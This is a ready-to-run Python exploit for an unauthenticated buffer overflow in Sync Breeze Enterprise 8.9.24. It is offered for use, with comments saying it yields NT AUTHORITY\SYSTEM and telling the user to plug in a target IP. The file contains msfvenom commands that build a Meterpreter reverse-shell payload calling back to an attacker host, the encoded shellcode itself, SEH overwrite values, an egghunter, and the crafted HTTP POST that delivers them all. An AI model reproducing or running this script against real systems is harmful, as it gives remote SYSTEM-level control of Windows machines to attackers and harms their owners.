#!/usr/bin/python
 
print "Sync Breeze Enterprise 8.9.24 Buffer Overflow Exploit"
print "Author: Tulpa / tulpa[at]tulpa-security[dot]com"
 
#Author website: www.tulpa-security.com
#Author twitter: @tulpa_security
 
#Exploit will land you NT AUTHORITY\SYSTEM
#You do not need to be authenticated, password below is garbage
#Swop out IP, shellcode and remember to adjust '\x41' for bytes
#Tested on Windows 7 x86 Enterprise SP1
 
#Greetings to ozzie_offsec and carbonated
 
import socket
import sys
 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('<TARGET IP>',<TARGET PORT>))
 
#bad chars \x00\x0a\x0d\x26
 
# The following command generates the shell code to replace the default code.
# msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=<YOUR IP>  LPORT=<YOUR PORT> -e x86/shikata_ga_nai -b '\x00\x0a\x0d\x26' -f python --smallest
# msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=172.16.1.2  LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d\x26' -f python --smallest
 
#payload size 308  -- Use this to adjust the number of line 77
 
########This is the code to replace with your MSFVenom Code ############
buf =  ""
buf += "\xba\xb5\x64\x39\xb5\xd9\xf7\xd9\x74\x24\xf4\x5e\x31"
buf += "\xc9\xb1\x47\x83\xee\xfc\x31\x56\x11\x03\x56\x11\xe2"
buf += "\x40\x98\xd1\x37\xaa\x61\x22\x58\x23\x84\x13\x58\x57"
buf += "\xcc\x04\x68\x1c\x80\xa8\x03\x70\x31\x3a\x61\x5c\x36"
buf += "\x8b\xcc\xba\x79\x0c\x7c\xfe\x18\x8e\x7f\xd2\xfa\xaf"
buf += "\x4f\x27\xfa\xe8\xb2\xc5\xae\xa1\xb9\x7b\x5f\xc5\xf4"
buf += "\x47\xd4\x95\x19\xcf\x09\x6d\x1b\xfe\x9f\xe5\x42\x20"
buf += "\x21\x29\xff\x69\x39\x2e\x3a\x20\xb2\x84\xb0\xb3\x12"
buf += "\xd5\x39\x1f\x5b\xd9\xcb\x5e\x9b\xde\x33\x15\xd5\x1c"
buf += "\xc9\x2d\x22\x5e\x15\xb8\xb1\xf8\xde\x1a\x1e\xf8\x33"
buf += "\xfc\xd5\xf6\xf8\x8b\xb2\x1a\xfe\x58\xc9\x27\x8b\x5f"
buf += "\x1e\xae\xcf\x7b\xba\xea\x94\xe2\x9b\x56\x7a\x1b\xfb"
buf += "\x38\x23\xb9\x77\xd4\x30\xb0\xd5\xb1\xf5\xf8\xe5\x41"
buf += "\x92\x8b\x96\x73\x3d\x27\x31\x38\xb6\xe1\xc6\x49\xd0"
buf += "\x12\x18\xf1\xb1\xed\x99\x02\x9b\x29\xcd\x52\xb3\x98"
buf += "\x6e\x39\x43\x25\xbb\xd4\x49\xb1\xe8\x39\x4f\x43\x99"
buf += "\x3b\x4f\x52\x05\xb5\xa9\x04\xe5\x95\x65\xe4\x55\x56"
buf += "\xd6\x8c\xbf\x59\x09\xac\xbf\xb3\x22\x46\x50\x6a\x1a"
buf += "\xfe\xc9\x37\xd0\x9f\x16\xe2\x9c\x9f\x9d\x01\x60\x51"
buf += "\x56\x6f\x72\x05\x96\x3a\x28\x83\xa9\x90\x47\x2b\x3c"
buf += "\x1f\xce\x7c\xa8\x1d\x37\x4a\x77\xdd\x12\xc1\xbe\x4b"
buf += "\xdd\xbd\xbe\x9b\xdd\x3d\xe9\xf1\xdd\x55\x4d\xa2\x8d"
buf += "\x40\x92\x7f\xa2\xd9\x07\x80\x93\x8e\x80\xe8\x19\xe9"
buf += "\xe7\xb6\xe2\xdc\xf9\x8b\x34\x18\x8c\xe5\x84"
 
 
#pop pop ret 10030991
 
nseh = "\x90\x90\xEB\x0B"
seh = "\x91\x09\x03\x10"
 
egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
 
 
evil =  "POST /login HTTP/1.1\r\n"
evil += "Host: 172.16.1.2\r\n"
evil += "User-Agent: Mozilla/5.0\r\n"
evil += "Connection: close\r\n"
evil += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
evil += "Accept-Language: en-us,en;q=0.5\r\n"
evil += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
evil += "Keep-Alive: 300\r\n"
evil += "Proxy-Connection: keep-alive\r\n"
evil += "Content-Type: application/x-www-form-urlencoded\r\n"
evil += "Content-Length: 17000\r\n\r\n"
evil += "username=admin"
evil += "&password=aaaaa\r\n"
                        #The base number is 308 your payload size minus this number will allow you to adjust the payload. In this case my code was 310.. 308-310 = 2. So I adjusted down by 2
evil += "\x41" * 12290 #subtract/add for payload
evil += "w00tw00t"
evil += "\x90" * 20
evil += buf
evil += "\x90" * 50
evil += "\x42" * 1614
evil += nseh
evil += seh
evil += "\x90" * 20
evil += egghunter
evil += "\x90" * 7000
 
print 'Sending evil buffer...'
s.send(evil)
print 'Payload Sent!'
s.close()
